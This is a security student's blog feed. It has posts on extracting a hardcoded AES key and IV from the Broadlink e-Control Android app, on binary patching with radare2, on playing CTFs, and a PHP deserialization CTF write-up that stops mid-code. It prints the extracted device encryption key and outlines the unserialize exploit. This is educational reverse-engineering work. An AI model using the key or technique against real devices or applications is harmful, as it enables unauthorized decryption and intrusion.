<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-01-02T21:16:40-05:00</updated><id>http://localhost:4000/</id><title type="html">wolfshirtz</title><subtitle>The personal blog of Tristan Messner(@wolfshirtz). I will mostly talk about information security and  software development. I am an information security student who is looking to become a red teamer or security researcher. I love a good cup of coffee and making things.</subtitle><entry><title type="html">Android Reverse Engineering: Broadlink econtrol</title><link href="http://localhost:4000/re/andriod/2019/08/13/Android-Reverse-Engineering-Broadlink-econtrol.html" rel="alternate" type="text/html" title="Android Reverse Engineering: Broadlink econtrol" /><published>2019-08-13T00:00:00-04:00</published><updated>2019-08-13T00:00:00-04:00</updated><id>http://localhost:4000/re/andriod/2019/08/13/Android-Reverse-Engineering:-Broadlink-econtrol</id><content type="html" xml:base="http://localhost:4000/re/andriod/2019/08/13/Android-Reverse-Engineering-Broadlink-econtrol.html">&lt;h3 id=&quot;an-introduction&quot;&gt;An introduction&lt;/h3&gt;
&lt;p&gt;The broadlink e-control was built to control broadlinks line of IR/RF emitters.
These devices are fairly inexpensive and given what they were built for, the homeautomation community has already
created support for the broadlink IR/RF switches. The purpose of this post is not to find or create something new, but to
demonstrate the process of how to tinker with IOT devices and their companion android applications. My goal for this post is to find the &lt;em&gt;coughs&lt;/em&gt;
spoiler &lt;em&gt;coughs&lt;/em&gt; 128 bit aes key and iv.&lt;/p&gt;

&lt;h2 id=&quot;why-android&quot;&gt;Why Android&lt;/h2&gt;
&lt;p&gt;To make it clear I am 100 percent sold to the IOS platform, but android applications have a few benefits when it comes to make RE a lot easier.
The first being that most android applications are written in java and decompilers can be used to obtain a close to source representation.
The second is that it is a lot easier to obtain apks (the android application package format) than it is ipas (the ios application package format).&lt;/p&gt;

&lt;h2 id=&quot;first-step-reconextraction&quot;&gt;First step: Recon/extraction&lt;/h2&gt;
&lt;p&gt;After obtaining the apk from &lt;a href=&quot;https://apkpure.com/e-control/com.broadlink.rmt&quot;&gt;Apkpure&lt;/a&gt;, the first step is to extract the contents of the apk. This is fairly simple because 
apks are zip files with other fancy jargon inside (More on said jargon later). To extract the contents of the apk this command will suffice.
&lt;code class=&quot;highlighter-rouge&quot;&gt;unzip econtrol.apk&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Here is the resulting file structure&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.
├── AndroidManifest.xml
├── assets
├── build-data.properties
├── classes.dex
├── com
├── e Control_v3.8.16_apkpure.com.apk
├── jsr305_annotations
├── lib
├── META-INF
├── org
├── res
└── resources.arsc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now a quick explination of the aformentioned jargon. The &lt;code class=&quot;highlighter-rouge&quot;&gt;AndroidManifest.xml&lt;/code&gt; is an Andriod binary xml file that contains information about the apk.
Most importantly it contians the permissions of the application; which is useful if you are reverse engineering malware.
The &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF&lt;/code&gt; directory contains more metadata. The &lt;code class=&quot;highlighter-rouge&quot;&gt;res&lt;/code&gt; directory has non code resources and lib has thirdparty or system libraries (non java).
The &lt;code class=&quot;highlighter-rouge&quot;&gt;classes.dex&lt;/code&gt; file is the compiled java byte code that will run on the dalvik vm (Androids JVM implementation).
In the case of the broadlink e-control application, what we care most about is the &lt;code class=&quot;highlighter-rouge&quot;&gt;classes.dex&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;lib&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;Next we can use jadx to decompile the apk into a new directory; &lt;code class=&quot;highlighter-rouge&quot;&gt;out&lt;/code&gt; in this command example.
&lt;code class=&quot;highlighter-rouge&quot;&gt;jadx -d out classes.dex&lt;/code&gt;
Next we can start poking around the decompiled code.
While browsing the source code a few files and directories stood out. Notably:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file: out/sources/cn/com/broadlink/networkapi/NetworkAPI.java
dir: out/sources/cn/com/broadlink/blnetworkdataparse
dir: out/sources/cn/com/broadlink/blnetworkunit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And now onto reverse engineering the code.&lt;/p&gt;

&lt;h2 id=&quot;reverseing-and-key-discovery&quot;&gt;Reverseing and key discovery&lt;/h2&gt;
&lt;p&gt;The first off is the NetworkAPI java file. This file wraps a system library; which means that we get to reverse some arm assembly.
Under the lib directory there is a file called libNetworkAPI.so which is an android shared object.
Next, we can open up the NetworkAPI shared object into ghidra. 
After opening the shared object with ghidra I started by searching for xrefs on the socket function. I found a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;bl_device_send_data&lt;/code&gt;.
This function is the lower level version of another function called &lt;code class=&quot;highlighter-rouge&quot;&gt;networkapi_device_send_data&lt;/code&gt;. Luckily for us the broadlink developers left
several debug messages that help in identifying functions that ghidra did not detect. While reverse engineering the network stack I discovered two things.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The application uses udp for communication.(Interesting if you wanted to reimplement the entire api)&lt;/li&gt;
  &lt;li&gt;Data is encrypted with 128 bit aes.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;It should be noted that there are other interesting things in this binary, but for the sake of keeping this short I will focus on getting the key and IV.
While performing static analysis on the shared object I was able to find the IV in the decompilation of the function &lt;code class=&quot;highlighter-rouge&quot;&gt;data_aes_decrypt&lt;/code&gt;. 
&lt;img src=&quot;/assets/decryptFunc.png&quot; alt=&quot;The decryption function being called with log messages being shown&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I then copied the hex bytes of the key.
Next thing I do is look at the data entry under the one for the IV. Looking at it is 16 bytes (128 bit) just like the IV. Looking at the XREFs for the data it is accessed by a function that is in turn called by &lt;code class=&quot;highlighter-rouge&quot;&gt;bl_device_send_data&lt;/code&gt;.
So according to my findings the key should be &lt;code class=&quot;highlighter-rouge&quot;&gt;097628343fe99e23765c1513accf8b02&lt;/code&gt; in hex and the IV is &lt;code class=&quot;highlighter-rouge&quot;&gt;562e17996d093d28ddb3ba695a2e6f58&lt;/code&gt;. 
&lt;img src=&quot;/assets/ghidraKeys.png&quot; alt=&quot;The keys in ghidra listing view&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;confirmation&quot;&gt;Confirmation&lt;/h2&gt;
&lt;p&gt;The broadlink device has already been reverse engineered and the entire api has been reimplemented in python.
This is very helpful because instead of writing a script to test my findings I can read the already existing documentation. 
The documnetation can be accessed &lt;a href=&quot;https://github.com/mjg59/python-broadlink/blob/master/protocol.md&quot;&gt;here&lt;/a&gt;. Sure enough the key and iv I found were correct.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;While I did not make any ground breaking research, I was able to go through the process of reverse engineering a production android application.
I was able to gain more hands on experience with ghidra and the ARM platform. Most importantly it was a fun challenge and a nice change
from mostly reversing CTF challenges.&lt;/p&gt;

&lt;h2 id=&quot;other-good-resources&quot;&gt;Other good resources&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/&quot;&gt;Evilsocket’s android reversing 101&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://maddiestone.github.io/AndroidAppRE/app_fundamentals.html&quot;&gt;Maddie Stone’s android RE 101&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.android.com/docs&quot;&gt;Android Docs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><summary type="html">An introduction The broadlink e-control was built to control broadlinks line of IR/RF emitters. These devices are fairly inexpensive and given what they were built for, the homeautomation community has already created support for the broadlink IR/RF switches. The purpose of this post is not to find or create something new, but to demonstrate the process of how to tinker with IOT devices and their companion android applications. My goal for this post is to find the coughs spoiler coughs 128 bit aes key and iv.</summary></entry><entry><title type="html">Binary Patching Using Radare2</title><link href="http://localhost:4000/linux/assembly/2019/03/26/Binary-patching-using-radare2.html" rel="alternate" type="text/html" title="Binary Patching Using Radare2" /><published>2019-03-26T00:00:00-04:00</published><updated>2019-03-26T00:00:00-04:00</updated><id>http://localhost:4000/linux/assembly/2019/03/26/Binary-patching-using-radare2</id><content type="html" xml:base="http://localhost:4000/linux/assembly/2019/03/26/Binary-patching-using-radare2.html">&lt;p&gt;This blog post will talk about using radare2 to patch a binary on the linux platform. You can read this tutorial with no knowledge of radare, but
you will get a lot more out it if you have some basic knowledge about how to use radare.&lt;/p&gt;

&lt;h2 id=&quot;a-brief-introduction-to-concepts-used-in-this-blog-post&quot;&gt;A Brief Introduction to concepts used in this blog post&lt;/h2&gt;

&lt;h3 id=&quot;radare2&quot;&gt;Radare2&lt;/h3&gt;

&lt;p&gt;Radare2 is an open source reverse engineering framework that supports a large number of different processors and platforms. Radare2 is similar to tools like
IDA pro, Binary Ninja and Ghidra, but the main difference is that radare runs inside of a terminal window. This is nice because it means that radare can be used
over a ssh connection or on low power machines. Radare has a lot of awesome features, but this tutorial will focus on the main tool &lt;code class=&quot;highlighter-rouge&quot;&gt;r2&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;binary-patching&quot;&gt;Binary patching&lt;/h3&gt;

&lt;p&gt;Binary patching is the process of modifying a compiled executable to change the code that is run. Radare allows for assembly code to be written inline, compiled and inserted into the binary
without any hassle.&lt;/p&gt;

&lt;h2 id=&quot;okay-lets-patch-a-binary&quot;&gt;Okay lets patch a binary&lt;/h2&gt;

&lt;h3 id=&quot;getting-a-binary-to-patch&quot;&gt;Getting a binary to patch&lt;/h3&gt;

&lt;p&gt;First off lets get a binary to patch. Here is some source code from &lt;a href=&quot;https://challenges.re/55/&quot;&gt;challenges.re&lt;/a&gt; challenge 55.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;printing_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;f(%d)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printing_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Compile this using &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o patcher patcher.c&lt;/code&gt; then make a copy of the binary that we can mess up on when we try to patch it using &lt;code class=&quot;highlighter-rouge&quot;&gt;cp patcher test&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;reverse-time&quot;&gt;Reverse time&lt;/h3&gt;
&lt;p&gt;Fist of we need to open the binary in radare with write capabilities.
Run the command &lt;code class=&quot;highlighter-rouge&quot;&gt;r2 -w test&lt;/code&gt; and you will be presented with a radare prompt.
Next we need to analyze the binary. From the prompt type in &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa&lt;/code&gt; this will tell radare to anaylize all things apart of the binary.
To make this simple we can go in with the assumption that we know the program is written in c. Think to yourself “what is function exists in every c program”.
If you answered main you are correct.
Next we need to seek to the main function. The radare command to do this is very simple ‘s main’.
Now we are at the location of main. After this type the following command &lt;code class=&quot;highlighter-rouge&quot;&gt;V&lt;/code&gt; you will then see the terminal change don’t panic or hit any keys.
You are in the default visual mode, the hex editor, we need to swap into the inline disasembler. To do that hit the ‘p’ key.
You should be prompted with something that looks like this. 
 &lt;img src=&quot;/assets/radaremaindis.png&quot; alt=&quot;inline disassembler in radare2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From here you can navigate the disassembly using the arrow keys or J and K like in vim.
Radare makes it very easy to see what variables are mapped to what stack offset. In this case we can see the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;local_4h&lt;/code&gt; that is mapped to &lt;code class=&quot;highlighter-rouge&quot;&gt;rbp-0x4&lt;/code&gt; with the type int.
We also see the structure of a for loop starting at the &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp 0x68d&lt;/code&gt; instruction and the comaprison statement where the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;local_4h&lt;/code&gt; is compared to 9.
We also see the function &lt;code class=&quot;highlighter-rouge&quot;&gt;sym.printing_function&lt;/code&gt; being called with the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;local_4h&lt;/code&gt;.
What if we wanted to make it so that printing function was called say… 32 times. We would change the &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp&lt;/code&gt; instruction to &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp dword [local_4h_addr], 0x20&lt;/code&gt; , but how do we do that?
The answer is patching the binary using radare’s awesome patching powers. First “scroll” down to the &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp&lt;/code&gt; line and press the capital A key. You will be presented with a prompt that allows you to type assembly and have it be compiled and inserted in the place of the &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp&lt;/code&gt; line.
Here is what it will look like. The assembly to insert is &lt;code class=&quot;highlighter-rouge&quot;&gt;cmp dword [rbp-0x4], 0x20&lt;/code&gt;
&lt;img src=&quot;/assets/inlinepatch.png&quot; alt=&quot;Patch prompt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To finish off the patch hit enter and then hit q to exit the visual mode and then q enter to exit radare.
If you opened the binary in write mode you should be able to run &lt;code class=&quot;highlighter-rouge&quot;&gt;./test&lt;/code&gt; and get a different output then that of &lt;code class=&quot;highlighter-rouge&quot;&gt;./patcher&lt;/code&gt;
Congrats you have patched your first binary.&lt;/p&gt;

&lt;p&gt;Here is a gif from BBC’s James May: The Reassembler to celebrate your reverse engineering adventure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/may.gif&quot; alt=&quot;Reassembler&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;helpful-resources&quot;&gt;Helpful resources&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/binary-patching-brute-force-reverse-engineering-with-ida-and-hopper-and-hex-editor-0157194/&quot;&gt;With ida&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&quot;&gt;64 bit cheat sheet&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">This blog post will talk about using radare2 to patch a binary on the linux platform. You can read this tutorial with no knowledge of radare, but you will get a lot more out it if you have some basic knowledge about how to use radare.</summary></entry><entry><title type="html">Playing CTFs for fun and profit(but mostly fun)</title><link href="http://localhost:4000/ctfs/2019/01/23/why-to-play-ctfs.html" rel="alternate" type="text/html" title="Playing CTFs for fun and profit(but mostly fun)" /><published>2019-01-23T00:00:00-05:00</published><updated>2019-01-23T00:00:00-05:00</updated><id>http://localhost:4000/ctfs/2019/01/23/why-to-play-ctfs</id><content type="html" xml:base="http://localhost:4000/ctfs/2019/01/23/why-to-play-ctfs.html">&lt;h1 id=&quot;playing-ctfs-for-fun-and-profitbut-mostly-fun&quot;&gt;Playing CTFs for fun and profit(but mostly fun)&lt;/h1&gt;
&lt;p&gt;CTFs(or capture the flags) are competitions held to help hone and build upon skills
in information security. CTFs come in all difficulty levels and some that are more difficult
even have simpler versions of the main event.&lt;/p&gt;

&lt;h2 id=&quot;my-story-about-playing-ctfs&quot;&gt;My story about playing CTFs&lt;/h2&gt;
&lt;p&gt;The first CTF I played in was the Cleveland Bsides CTF.
I played on a walk on team where I met new people with various skill levels and we all learned from each others solutions
to problems. The team I played in scored 4th place. Afterwards, one of my teammates(&lt;a href=&quot;https://twitter.com/antman1P&quot;&gt;@antman1P&lt;/a&gt; on twitter) later invited me to play in ICE ctf.
We didn’t place, but I got to mess around with some new type of challenges. After that I played a few CTFs by myself (TUctf and otterctf).
Otterctf gave me experience with digital forensics and TUctf was a good ctf for sharpening my skills.
Then someone started commenting on my blog post I shared on reddit. I will refer them by their screen name &lt;a href=&quot;https://gr3yc1oud.wordpress.com/&quot;&gt;Gr3yc1oud&lt;/a&gt;(They have their own blog). We started messaging back and forth and decided that we wanted to collaborate on something.
We decided to form a CTF team. Gr3yc1oud posted on reddit looking for teammates and found another six people to join our team.
We first competed in giraffe CTF to get the team used to communicating with each other. After that, we decided to compete in 35c3 ctf.&lt;/p&gt;

&lt;h2 id=&quot;so-why-play-ctfs&quot;&gt;So, why play CTFs&lt;/h2&gt;
&lt;p&gt;There are multiple reasons to play a CTF, but I am going to focus on three of them.&lt;/p&gt;

&lt;h3 id=&quot;meet-new-people&quot;&gt;Meet new people&lt;/h3&gt;
&lt;p&gt;The best part about CTFs is playing them in a team. Yes, you can play them alone, but when you play them in a team 
setting you learn from your teammates and gain valuable contacts. You can quickly build a set of references by playing in teams, while also expanding your understanding of computer security.&lt;/p&gt;

&lt;h3 id=&quot;learn-new-techniques-and-practice&quot;&gt;Learn new techniques and practice&lt;/h3&gt;
&lt;p&gt;Playing a CTF challenge gives you a chance to build upon your existing skill set while testing your existing ones.
You get to learn about vulnerabilities in a safe and legal environment.&lt;/p&gt;

&lt;h3 id=&quot;breaking-stuff-is-just-fun&quot;&gt;Breaking stuff is just fun&lt;/h3&gt;
&lt;p&gt;This is kind of a duplicate of my second reason, but I think it deserves its own section.
Solving CTF challenges is just like solving a tricky puzzle. The only difference between solving CTF challenges and 
solving a riddle is that when you solve a CTF challenge you get to say to yourself “I’m in” like in the movies.&lt;/p&gt;

&lt;h2 id=&quot;finding-a-ctf-and-a-team&quot;&gt;Finding a CTF and a team&lt;/h2&gt;

&lt;h3 id=&quot;finding-a-ctf&quot;&gt;Finding a CTF&lt;/h3&gt;
&lt;p&gt;This part is actually very easy. There is a website that’s whole purpose is to help people find CTFs and to archive them.
That website is called &lt;a href=&quot;https://ctftime.org/&quot;&gt;ctftime&lt;/a&gt;. Ctftime is awesome, but they do not have every CTF that exists.
Another great way to find CTFs is to check your local bsides event. To find the closest bsides event go to this &lt;a href=&quot;http://www.securitybsides.com/w/page/12194156/FrontPage&quot;&gt;link&lt;/a&gt;.
Not every bsides has a CTF, but a lot do.&lt;/p&gt;

&lt;h3 id=&quot;finding-a-team&quot;&gt;Finding a team&lt;/h3&gt;
&lt;p&gt;This is the hardest part of playing CTFs. Some events that are at a physical location have walk on teams.
Walk on teams are an excellent way to meet people and get started playing CTFs.
The only issue is that a lot of online events do not have walk on teams. Finding a team for these can come out of complete random chance.
Ctftime has a way to find teams on their website but it takes time and occasionally teams will post comments on events saying that they are looking for new team members.
There is also an entire &lt;a href=&quot;https://reddit.com/r/CtfTeamLookUp/&quot;&gt;subreddit&lt;/a&gt;(I am a moderator for this subreddit) for finding ctf teams. The community is not very active, but the subreddit is still small and I am hopeful that it will grow.
Also, chat with people online that are into computer security and maybe you will find someone who wants to form a CTF team with you.&lt;/p&gt;

&lt;h2 id=&quot;a-final-note&quot;&gt;A final note&lt;/h2&gt;
&lt;p&gt;If you are completely new don’t let the fear of failure keep you from trying a CTF.
They are learning tools, so don’t get caught up in the competition aspect of it.&lt;/p&gt;</content><author><name></name></author><summary type="html">Playing CTFs for fun and profit(but mostly fun) CTFs(or capture the flags) are competitions held to help hone and build upon skills in information security. CTFs come in all difficulty levels and some that are more difficult even have simpler versions of the main event.</summary></entry><entry><title type="html">35c3c php challenge write up</title><link href="http://localhost:4000/writeup/web/2019/01/03/35c3-php-writeup.html" rel="alternate" type="text/html" title="35c3c php challenge write up" /><published>2019-01-03T00:00:00-05:00</published><updated>2019-01-03T00:00:00-05:00</updated><id>http://localhost:4000/writeup/web/2019/01/03/35c3-php-writeup</id><content type="html" xml:base="http://localhost:4000/writeup/web/2019/01/03/35c3-php-writeup.html">&lt;h1 id=&quot;35c3c-ctf-php&quot;&gt;35c3c CTF: php&lt;/h1&gt;
&lt;p&gt;I recently participated in the 35c3c ctf. I have enough time to do a quick write up
and this vulnerability class is intriguing to me.&lt;/p&gt;
&lt;h2 id=&quot;first-impressions&quot;&gt;First impressions&lt;/h2&gt;
&lt;p&gt;When first downloading the included file there is a tar archive with one file.
The file is a simple php script (the game ran it on a nc server). Opening up the file I can clearly
see the vaulnarability. Its contents are as follows.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Well that was unexpected…'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The vulnerability is a deserialization bug. That when done right allows us too get the flag.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;This bug is fairly simple to exploit. Since we have source code that we can modify we can echo out to the screen the serialized string of a instance of &lt;code class=&quot;highlighter-rouge&quot;&gt;class B&lt;/code&gt;.
We do that by modifying the code to this.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;STDIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
